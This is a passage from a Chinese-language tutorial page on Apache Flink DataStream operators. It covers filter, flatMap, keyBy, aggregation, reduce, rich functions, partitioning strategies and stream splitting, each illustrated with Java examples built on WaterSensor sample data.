class="string">"sensor_1"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).print();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 方式二：传入FilterFunction实现类</span></span><br><span class="line">        <span class="comment">// stream.filter(new UserFilter()).print();</span></span><br><span class="line">        </span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">UserFilter</span> <span class="keyword">implements</span> <span class="title">FilterFunction</span>&lt;<span class="title">WaterSensor</span>&gt; </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">filter</span><span class="params">(WaterSensor e)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> e.id.equals(<span class="string">"sensor_1"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>扁平映射（flatMap）</strong></p><p>latMap操作又称为扁平映射，主要是将数据流中的整体（一般是集合类型）拆分成一个一个的个体使用。消费一个元素，可以产生0到多个元素。flatMap可以认为是“扁平化”（flatten）和“映射”（map）两步操作的结合，也就是先按照某种规则对数据进行打散拆分，再对拆分后的元素做转换处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransFlatmap</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        DataStreamSource&lt;WaterSensor&gt; stream = env.fromElements(    </span><br><span class="line">      <span class="keyword">new</span> WaterSensor(<span class="string">"sensor_1"</span>, <span class="number">1</span>, <span class="number">1</span>),</span><br><span class="line">      <span class="keyword">new</span> WaterSensor(<span class="string">"sensor_1"</span>, <span class="number">2</span>, <span class="number">2</span>),</span><br><span class="line">      <span class="keyword">new</span> WaterSensor(<span class="string">"sensor_2"</span>, <span class="number">2</span>, <span class="number">2</span>),</span><br><span class="line">      <span class="keyword">new</span> WaterSensor(<span class="string">"sensor_3"</span>, <span class="number">3</span>, <span class="number">3</span>)</span><br><span class="line">        );</span><br><span class="line">        stream.flatMap(<span class="keyword">new</span> MyFlatMap()).print();</span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyFlatMap</span> <span class="keyword">implements</span> <span class="title">FlatMapFunction</span>&lt;<span class="title">WaterSensor</span>, <span class="title">String</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">flatMap</span><span class="params">(WaterSensor value, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (value.id.equals(<span class="string">"sensor_1"</span>)) &#123;</span><br><span class="line">                out.collect(String.valueOf(value.vc));</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (value.id.equals(<span class="string">"sensor_2"</span>)) &#123;</span><br><span class="line">                out.collect(String.valueOf(value.ts));</span><br><span class="line">                out.collect(String.valueOf(value.vc));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-2-聚合算子（Aggregation）">3.2 聚合算子（Aggregation）</h3><p><strong>按键分区（keyBy）</strong></p><p>keyBy是聚合前必须要用到的一个算子。keyBy通过指定键（key），可以将一条流从逻辑上划分成不同的分区（partitions）。这里所说的分区，其实就是并行处理的子任务。基于不同的key，流中的数据将被分配到不同的分区中去；这样一来，所有具有相同的key的数据，都将被发往同一个分区</p><p>在内部，是通过计算<strong>key的哈希值（hash code），对分区数进行取模运算来实现的</strong>。所以这里key如果是POJO的话，必须要重写hashCode()方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransKeyBy</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">        DataStreamSource&lt;WaterSensor&gt; stream = env.fromElements(</span><br><span class="line">      <span class="keyword">new</span> WaterSensor(<span class="string">"sensor_1"</span>, <span class="number">1</span>, <span class="number">1</span>),</span><br><span class="line">      <span class="keyword">new</span> WaterSensor(<span class="string">"sensor_1"</span>, <span class="number">2</span>, <span class="number">2</span>),</span><br><span class="line">      <span class="keyword">new</span> WaterSensor(<span class="string">"sensor_2"</span>, <span class="number">2</span>, <span class="number">2</span>),</span><br><span class="line">      <span class="keyword">new</span> WaterSensor(<span class="string">"sensor_3"</span>, <span class="number">3</span>, <span class="number">3</span>)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 方式一：使用Lambda表达式</span></span><br><span class="line">        KeyedStream&lt;WaterSensor, String&gt; keyedStream = stream.keyBy(e -&gt; e.id);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 方式二：使用匿名类实现KeySelector</span></span><br><span class="line">        KeyedStream&lt;WaterSensor, String&gt; keyedStream1 = stream.keyBy(<span class="keyword">new</span> KeySelector&lt;WaterSensor, String&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> String <span class="title">getKey</span><span class="params">(WaterSensor e)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> e.id;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是，keyBy得到的结果将不再是DataStream，而是会将DataStream转换为KeyedStream。KeyedStream可以认为是“分区流”或者“键控流”，它是对DataStream按照key的一个逻辑分区，所以泛型有两个类型：除去当前流中的元素类型外，还需要指定key的类型。</p><p>KeyedStream也继承自DataStream，所以基于它的操作也都归属于DataStream API。但它跟之前的转换操作得到的SingleOutputStreamOperator不同，只是一个流的分区操作，并不是一个转换算子。KeyedStream是一个非常重要的数据结构，只有基于它才可以做后续的聚合操作（比如sum，reduce）</p><p><strong>简单聚合（sum/min/max/minBy/maxBy）</strong></p><p>有了按键分区的数据流KeyedStream，我们就可以基于它进行聚合操作了。Flink为我们内置实现了一些最基本、最简单的聚合API，主要有以下几种：</p><ul><li>sum()：在输入流上，对指定的字段做叠加求和的操作</li><li>min()：在输入流上，对指定的字段求最小值</li><li>max()：在输入流上，对指定的字段求最大值</li><li>minBy()：与min()类似，在输入流上针对指定字段求最小值。不同的是，min()只计算指定字段的最小值，其他字段会保留最初第一个数据的值；而minBy()则会返回包含字段最小值的整条数据</li><li>maxBy()：与max()类似，在输入流上针对指定字段求最大值。两者区别与min()/minBy()完全一致</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 简单聚合算子使用非常方便，语义也非常明确。这些聚合方法调用时，也需要传入参数；但并不像基本转换算子那样需要实现自定义函数，只要说明聚合指定的字段就可以了。指定字段的方式有两种：指定位置，和指定名称</span></span><br><span class="line"><span class="comment">// 对于元组类型的数据，可以使用这两种方式来指定字段。需要注意的是，元组中字段的名称，是以f0、f1、f2、…来命名的</span></span><br><span class="line"><span class="comment">// 如果数据流的类型是POJO类，那么就只能通过字段名称来指定，不能通过位置来指定了</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransAggregation</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        DataStreamSource&lt;WaterSensor&gt; stream = env.fromElements(</span><br><span class="line">    <span class="keyword">new</span> WaterSensor(<span class="string">"sensor_1"</span>, <span class="number">1</span>, <span class="number">1</span>),</span><br><span class="line">    <span class="keyword">new</span> WaterSensor(<span class="string">"sensor_1"</span>, <span class="number">2</span>, <span class="number">2</span>),</span><br><span class="line">    <span class="keyword">new</span> WaterSensor(<span class="string">"sensor_2"</span>, <span class="number">2</span>, <span class="number">2</span>),</span><br><span class="line">    <span class="keyword">new</span> WaterSensor(<span class="string">"sensor_3"</span>, <span class="number">3</span>, <span class="number">3</span>)</span><br><span class="line">        );</span><br><span class="line">        stream.keyBy(e -&gt; e.id).max(<span class="string">"vc"</span>);    <span class="comment">// 指定字段名称</span></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>归约聚合（reduce）</strong></p><p>reduce可以对已有的数据进行归约处理，把每一个新输入的数据和当前已经归约出来的值，再做一个聚合计算，reduce操作也会将KeyedStream转换为DataStream。它不会改变流的元素数据类型，所以输出类型和输入类型是一样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 调用KeyedStream的reduce方法时，需要传入一个参数，实现ReduceFunction接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ReduceFunction</span>&lt;<span class="title">T</span>&gt; <span class="keyword">extends</span> <span class="title">Function</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="function">T <span class="title">reduce</span><span class="params">(T value1, T value2)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WaterSensorMapFunction</span> <span class="keyword">implements</span> <span class="title">MapFunction</span>&lt;<span class="title">String</span>,<span class="title">WaterSensor</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> WaterSensor <span class="title">map</span><span class="params">(String value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String[] datas = value.split(<span class="string">","</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> WaterSensor(datas[<span class="number">0</span>],Long.valueOf(datas[<span class="number">1</span>]) ,Integer.valueOf(datas[<span class="number">2</span>]) );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 案例演示</span></span><br><span class="line">StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">env</span><br><span class="line">   .socketTextStream(<span class="string">"hadoop102"</span>, <span class="number">7777</span>)</span><br><span class="line">   .map(<span class="keyword">new</span> WaterSensorMapFunction())</span><br><span class="line">   .keyBy(WaterSensor::getId)</span><br><span class="line">   .reduce(<span class="keyword">new</span> ReduceFunction&lt;WaterSensor&gt;()</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="meta">@Override</span></span><br><span class="line">       <span class="function"><span class="keyword">public</span> WaterSensor <span class="title">reduce</span><span class="params">(WaterSensor value1, WaterSensor value2)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">           System.out.println(<span class="string">"Demo7_Reduce.reduce"</span>);</span><br><span class="line"></span><br><span class="line">           <span class="keyword">int</span> maxVc = Math.max(value1.getVc(), value2.getVc());</span><br><span class="line">           <span class="comment">//实现max(vc)的效果  取最大值，其他字段以当前组的第一个为主</span></span><br><span class="line">           <span class="comment">//value1.setVc(maxVc);</span></span><br><span class="line">           <span class="comment">//实现maxBy(vc)的效果  取当前最大值的所有字段</span></span><br><span class="line">           <span class="keyword">if</span> (value1.getVc() &gt; value2.getVc())&#123;</span><br><span class="line">               value1.setVc(maxVc);</span><br><span class="line">               <span class="keyword">return</span> value1;</span><br><span class="line">           &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">               value2.setVc(maxVc);</span><br><span class="line">               <span class="keyword">return</span> value2;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;)</span><br><span class="line">   .print();</span><br><span class="line">env.execute();</span><br><span class="line"></span><br><span class="line"><span class="comment">// reduce同简单聚合算子一样，也要针对每一个key保存状态。因为状态不会清空，所以我们需要将reduce算子作用在一个有限key的流上</span></span><br></pre></td></tr></table></figure><h3 id="3-3-用户自定义函数（UDF）">3.3 用户自定义函数（UDF）</h3><p><strong>函数类（Function Classes）</strong></p><p>Flink暴露了所有UDF函数的接口，具体实现方式为接口或者抽象类，例如MapFunction、FilterFunction、ReduceFunction等。所以用户可以自定义一个函数类，实现对应的接口</p><p><strong>富函数类（Rich Function Classes）</strong></p><p>富函数类”也是DataStream API提供的一个函数类的接口，所有的Flink函数类都有其Rich版本。富函数类一般是以抽象类的形式出现的。例如：RichMapFunction、RichFilterFunction、RichReduceFunction等。与常规函数类的不同主要在于，富函数类可以获取运行环境的上下文，并拥有一些生命周期方法，所以可以实现更复杂的功能</p><ul><li>open()方法，是Rich Function的初始化方法，也就是会开启一个算子的生命周期。当一个算子的实际工作方法例如map()或者filter()方法被调用之前，open()会首先被调用</li><li>close()方法，是生命周期中的最后一个调用的方法，类似于结束方法。一般用来做一些清理工作</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 需要注意的是，这里的生命周期方法，对于一个并行子任务来说只会调用一次；而对应的，实际工作方法，例如RichMapFunction中的map()，在每条数据到来后都会触发一次调用</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RichFunctionExample</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">2</span>);</span><br><span class="line">        env</span><br><span class="line">                .fromElements(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line">                .map(<span class="keyword">new</span> RichMapFunction&lt;Integer, Integer&gt;() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                        <span class="keyword">super</span>.open(parameters);</span><br><span class="line">                        System.out.println(<span class="string">"索引是："</span> + getRuntimeContext().getIndexOfThisSubtask() + <span class="string">" 的任务的生命周期开始"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> Integer <span class="title">map</span><span class="params">(Integer integer)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> integer + <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                        <span class="keyword">super</span>.close();</span><br><span class="line">                        System.out.println(<span class="string">"索引是："</span> + getRuntimeContext().getIndexOfThisSubtask() + <span class="string">" 的任务的生命周期结束"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">                .print();</span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-4-物理分区算子（Physical-Partitioning）">3.4 物理分区算子（Physical Partitioning）</h3><blockquote><p>常见的物理分区策略有：随机分配（Random）、轮询分配（Round-Robin）、重缩放（Rescale）和广播（Broadcast）</p></blockquote><p><strong>随机分区（shuffle）</strong></p><p>最简单的重分区方式就是直接“洗牌”。通过调用DataStream的.shuffle()方法，将数据随机地分配到下游算子的并行任务中去。随机分区服从均匀分布（uniform distribution），所以可以把流中的数据随机打乱，均匀地传递到下游任务分区。因为是完全随机的，所以对于同样的输入数据, 每次执行得到的结果也不会相同</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShuffleExample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">     env.setParallelism(<span class="number">2</span>);</span><br><span class="line">        DataStreamSource&lt;Integer&gt; stream = env.socketTextStream(<span class="string">"hadoop102"</span>, <span class="number">7777</span>);;</span><br><span class="line">        stream.shuffle().print()</span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>轮询分区（Round-Robin）</strong></p><p>轮询，简单来说就是“发牌”，按照先后顺序将数据做依次分发。通过调用DataStream的.rebalance()方法，就可以实现轮询重分区。rebalance使用的是Round-Robin负载均衡算法，可以将输入流数据平均分配到下游的并行任务中去</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stream.rebalance()</span><br></pre></td></tr></table></figure><p><strong>重缩放分区（rescale）</strong></p><p>重缩放分区和轮询分区非常相似。当调用rescale()方法时，其实底层也是使用Round-Robin算法进行轮询，但是只会将数据轮询发送到下游并行任务的一部分中。rescale的做法是分成小团体，发牌人只给自己团体内的所有人轮流发牌</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stream.rescale()</span><br></pre></td></tr></table></figure><p><strong>广播（broadcast）</strong></p><p>这种方式其实不应该叫做“重分区”，因为经过广播之后，数据会在不同的分区都保留一份，可能进行重复处理。可以通过调用DataStream的broadcast()方法，将输入数据复制并发送到下游算子的所有并行任务中去</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stream.broadcast()</span><br></pre></td></tr></table></figure><p><strong>全局分区（global）</strong></p><p>全局分区也是一种特殊的分区方式。这种做法非常极端，通过调用.global()方法，会将所有的输入流数据都发送到下游算子的第一个并行子任务中去。这就相当于强行让下游任务并行度变成了1，所以使用这个操作需要非常谨慎，可能对程序造成很大的压力</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stream.global()</span><br></pre></td></tr></table></figure><p><strong>自定义分区（Custom）</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 自定义分区器</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyPartitioner</span> <span class="keyword">implements</span> <span class="title">Partitioner</span>&lt;<span class="title">String</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">partition</span><span class="params">(String key, <span class="keyword">int</span> numPartitions)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Integer.parseInt(key) % numPartitions;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用自定义分区</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PartitionCustomDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="comment">//        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span></span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.createLocalEnvironmentWithWebUI(<span class="keyword">new</span> Configuration());</span><br><span class="line">        env.setParallelism(<span class="number">2</span>);</span><br><span class="line">        DataStreamSource&lt;String&gt; socketDS = env.socketTextStream(<span class="string">"hadoop102"</span>, <span class="number">7777</span>);</span><br><span class="line">        DataStream&lt;String&gt; myDS = socketDS</span><br><span class="line">                .partitionCustom(</span><br><span class="line">                        <span class="keyword">new</span> MyPartitioner(),</span><br><span class="line">                        value -&gt; value);</span><br><span class="line">        myDS.print();</span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-5-分流">3.5 分流</h3><p>所谓“分流”，就是将一条数据流拆分成完全独立的两条、甚至多条流。也就是基于一个DataStream，定义一些筛选条件，将符合条件的数据拣选出来放到对应的流里</p><p><strong>简单实现</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SplitStreamByFilter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        SingleOutputStreamOperator&lt;Integer&gt; ds = env.socketTextStream(<span class="string">"hadoop102"</span>, <span class="number">7777</span>)</span><br><span class="line">                                                           .map(Integer::valueOf);</span><br><span class="line">        <span class="comment">//将ds 分为两个流 ，一个是奇数流，一个是偶数流</span></span><br><span class="line">        <span class="comment">//使用filter 过滤两次</span></span><br><span class="line">        SingleOutputStreamOperator&lt;Integer&gt; ds1 = ds.filter(x -&gt; x % <span class="number">2</span> == <span class="number">0</span>);</span><br><span class="line">        SingleOutputStreamOperator&lt;Integer&gt; ds2 = ds.filter(x -&gt; x % <span class="number">2</span> == <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        ds1.print(<span class="string">"偶数"</span>);</span><br><span class="line">        ds2.print(<span class="string">"奇数"</span>);</span><br><span class="line">        </span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ，是将原始数据流stream复制三份，然后对每一份分别做筛选</span></span><br></pre></td></tr></table></figure><p><strong>使用侧输出流</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SplitStreamByOutputTag</span> </span>&#123;    </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">        SingleOutputStreamOperator&lt;WaterSensor&gt; ds = env.socketTextStream(<span class="string">"hadoop102"</span>, <span class="number">7777</span>)</span><br><span class="line">              .map(<span class="keyword">new</span> WaterSensorMapFunction());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        OutputTag&lt;WaterSensor&gt; s1 = <span class="keyword">new</span> OutputTag&lt;&gt;(<span class="string">"s1"</span>, Types.POJO(WaterSensor<span class="class">.<span class="keyword">class</span>))</span>&#123;&#125;;</span><br><span class="line">        OutputTag&lt;WaterSensor&gt; s2 = <span class="keyword">new</span> OutputTag&lt;&gt;(<span class="string">"s2"</span>, Types.POJO(WaterSensor<span class="class">.<span 